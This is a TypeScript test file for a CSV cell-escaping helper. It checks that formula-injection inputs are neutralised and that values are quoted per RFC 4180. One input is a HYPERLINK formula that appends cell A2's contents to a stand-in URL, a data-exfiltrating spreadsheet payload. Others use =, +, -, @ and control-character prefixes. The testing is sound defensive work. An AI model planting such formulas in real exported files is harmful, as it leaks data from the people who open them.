// SPDX-License-Identifier: AGPL-3.0-or-later
import { csvCell } from './csv-cell';

describe('csvCell', () => {
  it.each([
    ['=HYPERLINK("https://x/?"&A2,"Open")', `"'=HYPERLINK(""https://x/?""&A2,""Open"")"`],
    ['+1+1', "'+1+1"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tx', "'\tx"],
    ['\r=1', `"'\r=1"`],
  ])('neutralizes %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('leaves numbers numeric', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell(-117.25)).toBe('-117.25');
    expect(csvCell(true)).toBe('true');
  });

  it('quotes per RFC 4180', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('plain')).toBe('plain');
    expect(csvCell(null)).toBe('');
    expect(csvCell('')).toBe('');
  });
});
